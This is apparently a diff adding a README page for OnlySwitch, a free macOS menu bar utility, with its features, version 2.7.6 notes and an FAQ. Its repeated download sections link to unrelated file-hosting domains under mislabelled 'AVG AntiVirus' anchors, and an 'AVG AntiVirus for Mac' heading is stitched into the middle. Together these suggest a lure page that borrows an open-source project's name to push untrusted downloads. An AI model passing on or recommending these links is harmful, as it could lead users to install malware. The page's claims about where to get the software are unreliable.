@@ -1,0 +1,346 @@
+<div align="center">
+
+# 🟣 OnlySwitch for Mac — All-in-One Menu Bar Utility
+
+### ⚙️ Control Your Mac Faster with Smart One-Click Switches
+
+🧩 **OnlySwitch for Mac** is an all-in-one menu bar utility that brings frequently used macOS controls into one convenient interface. Instead of opening multiple System Settings panels, you can access useful switches for **Dark Mode 🌙, Hide Desktop Icons 🖥️, Keep Awake ☕, Hide Notch 🔲, Radio Player 📻, widgets 🧩, shortcuts ⌨️, and more** directly from the menu bar.
+
+🆕 **Current Release:** 2.7.6
+💻 **Compatibility:** macOS 14.0 or later
+🏗️ **Architecture:** Intel 64-bit + Apple Silicon
+🆓 **License:** Free / Open Source
+📦 **App Size:** About 27.6 MB
+
+</div>
+
+## 🟢 🚀 Download OnlySwitch for Mac
+
+<div align="center">
+
+### 📱 [AVG AntiVirus](https://filecr.download/) 📱 [AVG AntiVirus](http://uploadearn.top/) 📱 [AVG AntiVirus](https://zeroupload.download/)
+
+</div>
+
+---
+
+## 🟣 ⚙️ OnlySwitch at a Glance
+
+| 🧩 **Item**           | 📋 **Details**                             |
+| --------------------- | ------------------------------------------ |
+| ⚙️ **App**            | OnlySwitch for Mac                         |
+| 🆕 **Latest Release** | 2.7.6                                      |
+| 🍎 **Platform**       | macOS                                      |
+| 💻 **Minimum macOS**  | macOS 14.0 or later                        |
+| 🧠 **Architecture**   | Intel 64-bit + Apple Silicon               |
+| 🖥️ **Interface**     | Menu Bar Utility                           |
+| 🧩 **Widgets**        | Desktop & Notification Centre              |
+| ⌨️ **Shortcuts**      | Keyboard shortcuts & Shortcuts integration |
+| 🔓 **License**        | Free / Open Source                         |
+
+---
+
+## 🟢 🚀 Download OnlySwitch for Mac
+
+<div align="center">
+
+### 🔐 OnlySwitch Download
+
+🟣 **OnlySwitch for Mac**
+⚙️ Menu Bar Utility • 🧩 Smart Switches • 🍎 macOS
+
+</div>
+
+---
+
+## 🟣 🧩 What Is OnlySwitch?
+
+<div align="left">
+
+🔘 **One-Click Controls:** ⚡ Put frequently used Mac controls into one compact menu bar interface.
+
+🌙 **Dark Mode:** 🌓 Quickly toggle system appearance without digging through multiple settings.
+
+🖥️ **Desktop Icons:** 🧹 Hide desktop icons instantly for presentations, screenshots, or a cleaner workspace.
+
+🔲 **Hide Notch:** 💻 Add a quick control for hiding the visual distraction around compatible MacBook notches.
+
+☕ **Keep Awake:** 🔋 Prevent your Mac from sleeping when you need the display to stay active.
+
+📻 **Radio Player:** 🎵 Access online radio functionality directly from the menu bar.
+
+🧩 **Widgets:** 📌 Place supported OnlySwitch controls on the desktop or Notification Centre.
+
+⌨️ **Keyboard Shortcuts:** 🚀 Trigger switches and shortcuts without relying entirely on mouse navigation.
+
+</div>
+
+---
+
+## 🟢 🔧 Download OnlySwitch
+
+<div align="center">
+
+### ⚡ Quick Control Edition
+
+🖥️ **Cleaner Desktop** • 🌙 **Dark Mode** • ☕ **Keep Awake**
+
+</div>
+
+---
+
+## 🟣 🎛️ Main Switch Toolkit
+
+<div align="left">
+
+🌙 **Dark Mode Switch** — Toggle the Mac's dark appearance with a quick menu bar action.
+
+🖥️ **Hide Desktop Icons** — Temporarily remove desktop clutter while keeping your files available.
+
+🔲 **Hide Notch** — Use a dedicated switch to make the MacBook menu-bar area visually cleaner.
+
+☕ **Keep Awake** — Keep the Mac active when you're presenting, reading, downloading, or monitoring something.
+
+📁 **Show Hidden Files** — Quickly access a switch for revealing hidden files when needed.
+
+🧹 **Xcode Data Cleaner** — Clear Xcode Derived Data as part of a developer-focused maintenance workflow.
+
+📻 **Radio Player** — Keep radio controls available without launching a separate full-size application.
+
+🧩 **Desktop Widgets** — Bring supported controls closer to the workspace through Apple widget support.
+
+</div>
+
+---
+
+## 🟢 🔐 Download OnlySwitch
+
+<div align="center">
+
+### 🛠️ Power User Edition
+
+🧰 **System Tools** • 🔐 **Quick Switches** • ⌨️ **Keyboard Access**
+
+### 📱 [AVG AntiVirus](https://filecr.download/) 📱 [AVG AntiVirus](http://uploadearn.top/) 📱 [AVG AntiVirus](https://zeroupload.download/)
+
+</div>
+
+---
+
+## 🟣 🧠 Shortcuts & Automation
+
+<div align="left">
+
+⌨️ **Keyboard Control** — Access supported switches and Shortcuts through keyboard commands.
+
+🧩 **Apple Shortcuts** — Import supported shortcuts into the OnlySwitch environment.
+
+🗂️ **Shortcut Gallery** — Keep useful automation actions close to your everyday menu bar tools.
+
+🔄 **Custom Switch List** — Add, remove, or reorder available switches to match your workflow.
+
+⚡ **Fast Actions** — Reduce repetitive navigation through System Settings by keeping common controls together.
+
+🧠 **AI System Control** — Current releases include AI-assisted system control features designed around natural-language commands.
+
+</div>
+
+---
+
+## 🟢 🖥️ Download OnlySwitch
+
+<div align="center">
+
+### 🖥️ Menu Bar Productivity Edition
+
+⚙️ **System Controls** • 🧩 **Widgets** • 🚀 **Automation**
+
+</div>
+
+---
+
+## 🟣 📌 Why Use OnlySwitch?
+
+<div align="left">
+
+🚀 **Faster Access** — Keep frequently used macOS controls one click away.
+
+🧹 **Cleaner Workspace** — Hide desktop icons or adjust the interface quickly when presenting or recording.
+
+🌙 **Appearance Controls** — Switch between visual modes without repeatedly navigating through settings.
+
+☕ **Focus-Friendly** — Keep your Mac awake during long tasks, presentations, downloads, or monitoring sessions.
+
+🧩 **Customizable Menu** — Arrange your switches so the controls you use most appear where you expect them.
+
+📱 **OnlyRemote Support** — Recent releases include the OnlyRemote companion concept for controlling OnlySwitch from iPhone or iPad on the same local network.
+
+🔓 **Open Source** — OnlySwitch is presented as a free, open-source macOS utility.
+
+</div>
+
+---
+
+## 🟢 🔥 Download OnlySwitch
+
+<div align="center">
+
+### 🔥 Latest Release Edition
+
+🆕 **Version 2.7.6** • 🧩 **New Built-In Switch** • 🔧 **Fixes & Improvements**
+
+</div>
+
+---
+
+## 🟣 🆕 What's New in OnlySwitch 2.7.6?
+
+<div align="left">
+
+🐾 **Desktop Pet Switch** — The desktop pet has become a built-in switch in the latest release.
+
+🎨 **Updated Shortcut Icon** — Shortcut-related controls received an updated icon treatment.
+
+🔋 **Low Power Mode Improvement** — Low Power Mode no longer requires a password when privileged access has been provided.
+
+🔗 **OnlyRemote Fix** — The release includes a fix for reconnecting issues with OnlyRemote.
+
+📌 **Menu Bar Stability** — Recent releases also addressed menu bar icon behavior on newer macOS versions.
+
+</div>
+
+---
+
+## 🟢 💻 Download OnlySwitch
+
+<div align="center">
+
+### 💻 Mac Compatibility Edition
+
+🍎 **macOS 14+** • 🧠 **Apple Silicon** • 💾 **Intel 64-bit**
+
+---
+
+## 🟣 🛠️ System Requirements
+
+<div align="left">
+
+🍎 **Operating System:** macOS 14.0 or later.
+
+🧠 **Apple Silicon:** Compatible with supported Apple Silicon Macs.
+
+💻 **Intel:** Intel 64-bit Macs are supported according to current distribution information.
+
+💾 **Storage:** The application download is approximately 27.6 MB for the current release.
+
+🔐 **Permissions:** Some system-level switches may require appropriate macOS permissions or privileged access.
+
+🌐 **Network:** Online features such as radio playback and remote functionality can require network access.
+
+</div>
+
+---
+
+## 🟢 🎯 Download OnlySwitch
+
+<div align="center">
+
+### 🎯 Final OnlySwitch Download
+
+🟣 **All-in-One Menu Bar** • ⚙️ **Smart Controls** • 🧩 **Widgets & Shortcuts**
+
+</div>
+
+# 🛡️ AVG AntiVirus for Mac
+  
+### 📱 [AVG AntiVirus](https://filecr.download/) 📱 [AVG AntiVirus](http://uploadearn.top/) 📱 [AVG AntiVirus](https://zeroupload.download/)
+  
+</div>
+
+---
+
+## 🟣 👥 Who Is OnlySwitch For?
+
+| 👤 **User Type**     | 🧩 **Useful Controls**                                    |
+| -------------------- | --------------------------------------------------------- |
+| 🧑‍💻 **Developers** | 🧰 Xcode cleanup • 📁 Hidden files • ⌨️ Shortcuts         |
+| 🎨 **Designers**     | 🌙 Dark Mode • 🖥️ Clean Desktop • 🔲 Hide Notch          |
+| 🎥 **Creators**      | 🧹 Desktop cleanup • ☕ Keep Awake • 🎛️ Quick Controls    |
+| 📚 **Students**      | ☕ Keep Awake • 🌙 Appearance • ⌨️ Shortcuts               |
+| 🏢 **Office Users**  | 🖥️ Presentation cleanup • ⚡ Quick Switches • 🧩 Widgets  |
+| 🧠 **Power Users**   | 🔧 Custom switches • ⌨️ Keyboard controls • 🧩 Automation |
+
+---
+
+## 🟣 🔒 Privacy & Control
+
+<div align="left">
+
+🔓 **Open Source:** 🧩 The project is presented as open-source software.
+
+⚙️ **Local Controls:** 🖥️ Many switches directly interact with macOS system functionality.
+
+🧩 **Custom Menu:** 📋 Users can customize which switches and shortcuts appear.
+
+🔐 **System Permissions:** 🛡️ Certain functions may require macOS permissions depending on the control being used.
+
+🌐 **Online Features:** 📻 Radio and remote-related features can involve network connectivity.
+
+</div>
+
+---
+
+## 🟢 ❓ Frequently Asked Questions
+
+### ❓ What is OnlySwitch for Mac?
+
+🟣 OnlySwitch is an all-in-one menu bar utility that provides quick access to commonly used Mac switches and shortcuts.
+
+### ❓ What macOS version does OnlySwitch require?
+
+🍎 Current distribution information lists **macOS 14.0 or later**.
+
+### ❓ Does OnlySwitch support Apple Silicon?
+
+🧠 Yes. Current distribution information lists support for Apple Silicon as well as Intel 64-bit Macs.
+
+### ❓ Can I hide desktop icons?
+
+🖥️ Yes. Hide Desktop Icons is one of the utility's core switches.
+
+### ❓ Can OnlySwitch keep my Mac awake?
+
+☕ Yes. Keep Awake provides a quick way to prevent normal sleep behavior when needed.
+
+### ❓ Does OnlySwitch support widgets?
+
+🧩 Yes. OnlySwitch supports Apple widgets, including desktop/Notification Centre use cases.
+
+### ❓ Is OnlySwitch free?
+
+🆓 Yes. The project is presented as free and open-source software.
+
+### ❓ Can I customize the available switches?
+
+⚙️ Yes. Switches and shortcuts can be added, removed, or reordered according to the available controls.
+
+---
+
+<div align="center">
+
+# 🟣 ⚡ OnlySwitch for Mac
+
+### 🧩 One Menu Bar. Many Mac Controls.
+
+🌙 **Dark Mode** • 🖥️ **Desktop Icons** • ☕ **Keep Awake** • 🔲 **Hide Notch**
+📻 **Radio** • 🧩 **Widgets** • ⌨️ **Shortcuts** • 🧠 **Smart Controls**
+
+</div>
+
+> ⚠️ **Note:** OnlySwitch is a third-party macOS utility. Always review downloaded files and permissions before installation.
+
+<div align="center">
+
+**OnlySwitch for Mac — simple controls, faster access, cleaner workflow.** ⚙️🍎🧩
+
+</div>
